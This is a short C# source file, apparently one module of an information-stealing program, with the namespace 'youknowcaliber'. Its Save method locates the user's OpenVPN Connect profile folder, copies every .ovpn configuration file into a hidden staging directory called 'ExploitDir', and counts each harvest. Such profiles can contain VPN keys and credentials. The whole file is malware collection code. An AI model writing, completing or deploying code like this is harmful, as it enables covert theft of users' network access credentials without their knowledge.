﻿using System;
using System.IO;

namespace youknowcaliber
{
	internal class OpenVPN
	{
		public static void Save()
		{
			string exploitDir = Help.ExploitDir;
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OpenVPN Connect\\profiles");
			bool flag = !Directory.Exists(path);
			if (!flag)
			{
				try
				{
					Directory.CreateDirectory(exploitDir + "\\VPN\\OpenVPN");
					foreach (string text in Directory.GetFiles(path))
					{
						bool flag2 = Path.GetExtension(text).Contains("ovpn");
						if (flag2)
						{
							File.Copy(text, Path.Combine(exploitDir, "\\VPN\\OpenVPN" + Path.GetFileName(text)));
						}
					}
					Counting.OpenVPN++;
				}
				catch (Exception value)
				{
					Console.WriteLine(value);
				}
			}
		}
	}
}
